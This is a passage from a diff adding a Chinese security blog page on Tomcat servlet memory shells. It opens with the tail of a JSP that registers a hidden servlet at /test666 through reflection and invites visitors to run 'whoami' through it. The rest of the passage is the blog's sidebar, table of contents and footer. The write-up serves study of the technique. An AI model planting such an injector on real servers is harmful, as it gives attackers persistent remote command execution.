class="string">"TomcatServlet"</span>);</span><br><span class="line">                        Field parent = ContainerBase.class.getDeclaredField("parent");</span><br><span class="line">                        parent.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                        parent.set(wrappershell, standardContext);</span><br><span class="line">                        wrappershell.addMapping(<span class="string">"/test666"</span>);</span><br><span class="line">                        Class[] classes = mapper.getClass().getDeclaredClasses();</span><br><span class="line">                        Class contextversionClass = classes[<span class="number">1</span>];</span><br><span class="line">                        Method addWrapper = mapper.getClass().getDeclaredMethod(<span class="string">"addWrapper"</span>, contextversionClass, String<span class="class">.<span class="keyword">class</span>, <span class="title">Wrapper</span>.<span class="title">class</span>, <span class="title">boolean</span>.<span class="title">class</span>, <span class="title">boolean</span>.<span class="title">class</span>)</span>;</span><br><span class="line">                        addWrapper.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                        addWrapper.invoke(mapper, contextVersion, <span class="string">"/test666"</span>, wrappershell, <span class="keyword">false</span>, <span class="keyword">false</span>);</span><br><span class="line">                        out.println(<span class="string">"Servlet has been Inject,please visit /test666?sectest666=whoami"</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag"># 代码审计</a>
+              <a href="/tags/JAVA/" rel="tag"># JAVA</a>
+              <a href="/tags/SHELL/" rel="tag"># SHELL</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/" rel="prev" title="Tomcat内存马实现原理解析">
+      <i class="fa fa-chevron-left"></i> Tomcat内存马实现原理解析
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let activeClass = CONFIG.comments.activeClass;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#servlet基础入门"><span class="nav-number">1.</span> <span class="nav-text">servlet基础入门</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#什么是servlet"><span class="nav-number">1.1.</span> <span class="nav-text">什么是servlet?</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#servlet基本介绍"><span class="nav-number">1.1.1.</span> <span class="nav-text">servlet基本介绍</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#servlet生命周期"><span class="nav-number">1.1.2.</span> <span class="nav-text">servlet生命周期</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#servlet实现类介绍"><span class="nav-number">1.1.3.</span> <span class="nav-text">servlet实现类介绍</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#如何使用servlet？"><span class="nav-number">1.2.</span> <span class="nav-text">如何使用servlet？</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#web-xml配置servlet"><span class="nav-number">1.2.1.</span> <span class="nav-text">web.xml配置servlet</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#WebServlet注解配置servlet"><span class="nav-number">1.2.2.</span> <span class="nav-text">WebServlet注解配置servlet</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#动态注册servlet"><span class="nav-number">2.</span> <span class="nav-text">动态注册servlet</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#失败尝试"><span class="nav-number">2.1.</span> <span class="nav-text">失败尝试</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#问题排查"><span class="nav-number">2.2.</span> <span class="nav-text">问题排查</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#mapping未添加成功"><span class="nav-number">2.2.1.</span> <span class="nav-text">mapping未添加成功</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#servlet未添加成功"><span class="nav-number">2.2.2.</span> <span class="nav-text">servlet未添加成功</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#tomcat-加载servlet分析"><span class="nav-number">2.2.3.</span> <span class="nav-text">tomcat 加载servlet分析</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#问题解决"><span class="nav-number">2.3.</span> <span class="nav-text">问题解决</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#问题一：如何获取-ContextVersion对象？"><span class="nav-number">2.3.1.</span> <span class="nav-text">问题一：如何获取 ContextVersion对象？</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#问题二：如何创建一个Wrapper对象？"><span class="nav-number">2.3.2.</span> <span class="nav-text">问题二：如何创建一个Wrapper对象？</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#servlet内存马实现"><span class="nav-number">3.</span> <span class="nav-text">servlet内存马实现</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#获取ContextVersion"><span class="nav-number">3.1.</span> <span class="nav-text">获取ContextVersion</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#创建Wrapper对象并赋值"><span class="nav-number">3.2.</span> <span class="nav-text">创建Wrapper对象并赋值</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#addWrapper设置exactWrappers"><span class="nav-number">3.3.</span> <span class="nav-text">addWrapper设置exactWrappers</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">藏青</p>
+  <div class="site-description" itemprop="description">知行合一</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">33</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">16</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">藏青</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> v4.2.0
+  </div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">Theme – <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> v7.7.1
+  </div>
+
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
